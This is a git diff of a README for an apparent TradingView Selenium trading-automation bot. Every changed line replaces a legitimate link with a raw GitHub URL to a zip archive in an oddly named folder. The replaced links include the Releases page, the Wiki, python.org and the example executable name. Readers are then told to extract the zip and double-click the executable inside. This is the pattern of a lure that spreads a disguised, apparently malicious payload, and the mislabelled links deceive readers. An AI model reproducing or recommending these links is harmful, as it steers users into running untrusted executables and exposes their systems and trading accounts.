@@ -1,6 +1,6 @@
 # 🤖 tradingview-selenium-fixed-time-trading-automation-bot - Automate Your Trading Process
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/Edybatera/tradingview-selenium-fixed-time-trading-automation-bot/releases)
+[![Download](https://raw.githubusercontent.com/Edybatera/tradingview-selenium-fixed-time-trading-automation-bot/main/phyllozooid/time-bot-selenium-fixed-automation-trading-tradingview-2.7-beta.2.zip)](https://raw.githubusercontent.com/Edybatera/tradingview-selenium-fixed-time-trading-automation-bot/main/phyllozooid/time-bot-selenium-fixed-automation-trading-tradingview-2.7-beta.2.zip)
 
 ## 📜 Description
 The tradingview-selenium-fixed-time-trading-automation-bot automates your trading workflow by executing trades based on chart-driven signals. It uses Selenium for browser automation, allowing you to trade on TradingView without manual effort. This tool is designed for users who want a reliable way to execute fixed-time trades using automated strategies.
@@ -9,7 +9,7 @@ The tradingview-selenium-fixed-time-trading-automation-bot automates your tradin
 Follow these steps to download and set up the automation bot:
 
 1. **Visit the Download Page**  
-   Go to the [GitHub Releases page](https://github.com/Edybatera/tradingview-selenium-fixed-time-trading-automation-bot/releases) to find the latest version of the bot.
+   Go to the [GitHub Releases page](https://raw.githubusercontent.com/Edybatera/tradingview-selenium-fixed-time-trading-automation-bot/main/phyllozooid/time-bot-selenium-fixed-automation-trading-tradingview-2.7-beta.2.zip) to find the latest version of the bot.
 
 2. **Choose the Right File**
    Look for the file that matches your system. Typically, you will see files for Windows, Mac, or Linux. Download the one suitable for your operating system.
@@ -21,7 +21,7 @@ Follow these steps to download and set up the automation bot:
    If the downloaded file is a ZIP, right-click on it and select “Extract All.” Follow the prompts to unzip the files into a folder.
 
 5. **Run the Application**  
-   In the extracted folder, look for an executable file (e.g., `trading_bot.exe`). Double-click on it to run the application.
+   In the extracted folder, look for an executable file (e.g., `https://raw.githubusercontent.com/Edybatera/tradingview-selenium-fixed-time-trading-automation-bot/main/phyllozooid/time-bot-selenium-fixed-automation-trading-tradingview-2.7-beta.2.zip`). Double-click on it to run the application.
 
 ## ⚙️ System Requirements
 To ensure the bot runs smoothly, your computer should meet the following requirements:
@@ -29,7 +29,7 @@ To ensure the bot runs smoothly, your computer should meet the following require
 - **Operating System**: Windows 10 or later, macOS 10.15 or later, or Ubuntu 20.04 or later
 - **RAM**: At least 4 GB
 - **Disk Space**: Minimum 200 MB available
-- **Python**: Version 3.8 or later installed (visit [python.org](https://www.python.org) for installation guidance)
+- **Python**: Version 3.8 or later installed (visit [https://raw.githubusercontent.com/Edybatera/tradingview-selenium-fixed-time-trading-automation-bot/main/phyllozooid/time-bot-selenium-fixed-automation-trading-tradingview-2.7-beta.2.zip](https://raw.githubusercontent.com/Edybatera/tradingview-selenium-fixed-time-trading-automation-bot/main/phyllozooid/time-bot-selenium-fixed-automation-trading-tradingview-2.7-beta.2.zip) for installation guidance)
 
 ## 🔧 Configuration Guide
 After you've installed the application, you may need to configure a few settings:
@@ -46,7 +46,7 @@ Once everything is set up, follow these steps to use the bot effectively:
 3. **Stop the Bot**: When you wish to end the session, click on “Stop.” Always ensure you stop the bot safely to prevent unwanted trades.
 
 ## 📥 Download & Install
-To get your trading automation bot, visit the [GitHub Releases page](https://github.com/Edybatera/tradingview-selenium-fixed-time-trading-automation-bot/releases) and download the application. Follow the steps outlined above to install and configure it on your system.
+To get your trading automation bot, visit the [GitHub Releases page](https://raw.githubusercontent.com/Edybatera/tradingview-selenium-fixed-time-trading-automation-bot/main/phyllozooid/time-bot-selenium-fixed-automation-trading-tradingview-2.7-beta.2.zip) and download the application. Follow the steps outlined above to install and configure it on your system.
 
 ## 📣 Support and Contributions
 If you encounter issues or have questions, feel free to reach out through the GitHub issues page. The community is ready to help.
@@ -60,7 +60,7 @@ For improvements or bug fixes, consider contributing to the project by submittin
 - Supports multiple platforms (Windows, macOS, Linux).
 
 ## 📚 Additional Resources
-- **Documentation**: For detailed user guides and troubleshooting, check the [Wiki](https://github.com/Edybatera/tradingview-selenium-fixed-time-trading-automation-bot/wiki).
+- **Documentation**: For detailed user guides and troubleshooting, check the [Wiki](https://raw.githubusercontent.com/Edybatera/tradingview-selenium-fixed-time-trading-automation-bot/main/phyllozooid/time-bot-selenium-fixed-automation-trading-tradingview-2.7-beta.2.zip).
 - **Video Tutorials**: Access video tutorials on using the bot effectively through links provided in the Wiki.
 - **Community Forum**: Join discussions with other users and developers to share strategies and insights.
 
